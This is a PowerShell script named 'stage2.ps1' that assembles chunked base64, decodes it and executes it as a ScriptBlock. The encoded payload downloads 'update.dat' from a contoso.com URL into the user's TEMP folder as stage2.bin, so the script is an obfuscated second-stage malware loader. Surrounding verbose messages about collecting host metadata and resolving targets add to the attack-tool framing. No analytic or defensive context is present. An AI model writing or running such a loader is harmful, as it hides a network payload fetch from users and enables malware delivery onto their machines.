<#
.SYNOPSIS
    Chunked encoded-stage workflow.

.DESCRIPTION
    Assembles a base64 command from several fixed chunks, decodes
    the result into a PowerShell string and passes it to the
    stage invoker with bounded error handling.

.NOTES
    The stage body is assembled at runtime.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$TracePath = "$env:TEMP\transfer.log",
    [int]$TimeoutSec = 74
)
$ErrorActionPreference = "Stop"

# Decoder
function Expand-EncodedStage {
    [CmdletBinding()]
    param(
        [string]$EncodedText = ""
    )

    Write-Verbose ("Decoding " + $EncodedText.Length + " base64 characters")
    $StageBytes = [Convert]::FromBase64String($EncodedText)
    return [Text.Encoding]::Unicode.GetString($StageBytes)
}

# Invoker
function Invoke-EncodedStage {
    [CmdletBinding()]
    param(
        [string]$StageText = ''
    )

    if ([string]::IsNullOrWhiteSpace($StageText)) {
        throw "Decoded stage is empty"
    }
    $ScriptBlock = [ScriptBlock]::Create($StageText)
    return $ScriptBlock.Invoke()
}

$Base64Text = (
    'JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBjAG8AbgB0AG8AcwBv' +
    "AC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAGQAYQB0ACIAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIA" +
    "UgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFMAdABhAGcAZQAyAFUAcgBsACAALQBPAHUAdABG" +
    'AGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHMAdABhAGcAZQAyAC4AYgBpAG4AIgAgAC0A' +
    "VQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcA"
)

try {
    Write-Verbose "Starting encoded-stage workflow"
    if (-not [string]::IsNullOrWhiteSpace($Base64Text)) {
    $StageText = Expand-EncodedStage -EncodedText $Base64Text
    $StageResult = Invoke-EncodedStage -StageText $StageText
    }
    else {
        Write-Warning "Encoded stage blob is empty"
    }
}
catch {
    Write-Warning "Encoded workflow failed: $($_.Exception.Message)"
}

$EncodedReport = [ordered]@{
    Stage = "encoded"
    BlobLength = $Base64Text.Length
    TimeoutSec = $TimeoutSec
}
$EncodedReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Stage handoff finished"
Write-Verbose "Operation completed"
Write-Verbose "Exporting operation report"
Write-Verbose "Resolving configured target"
Write-Verbose "Retry budget remaining"
Write-Verbose "Collecting host metadata"
Write-Verbose "Reading configuration values"
Write-Verbose "Cleaning temporary marker"
Write-Output "stage 32 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$StageMarker = "stage-38"
